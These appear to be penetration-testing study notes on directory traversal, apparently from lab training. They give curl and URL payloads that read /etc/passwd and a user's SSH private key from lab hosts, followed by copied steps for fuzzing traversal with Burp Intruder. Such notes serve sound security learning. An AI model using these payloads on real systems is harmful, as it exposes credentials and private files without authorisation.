## Directory Traversal

- [Payload All The Things DT](https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/)

```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd



curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa



w/encoding

curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd




```


### Burp Fuzzing

```

### Fuzzing for directory traversal vulnerabilities

You can alternatively use Burp Intruder to test for directory traversal vulnerabilities. This process also enables you to closely investigate any issues that Burp Scanner has identified:

1. In **Proxy > HTTP history** identify a request you want to investigate.
2. Right-click the request and select **Send to Intruder**.
3. Go to the **Intruder** tab.
4. Highlight the parameter that you want to test and click **Add §** to mark it as a payload position.
5. Go to the **Payloads** tab. Under **Payload Settings [Simple list]** add a list of directory traversal fuzz strings:
    
    1. If you're using Burp Suite Professional, select the built-in **Fuzzing - [path traversal](https://portswigger.net/web-security/file-path-traversal)** wordlist.
    2. If you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), manually add a list.
6. Click **Start attack**. The attack starts running in a new dialog. Intruder sends a request for each fuzz string on the list.
7. When the attack is finished, study the responses to look for any noteworthy behavior. For example, look for responses with a longer length. These may contain data that has been returned from the requested file.
8. 
```
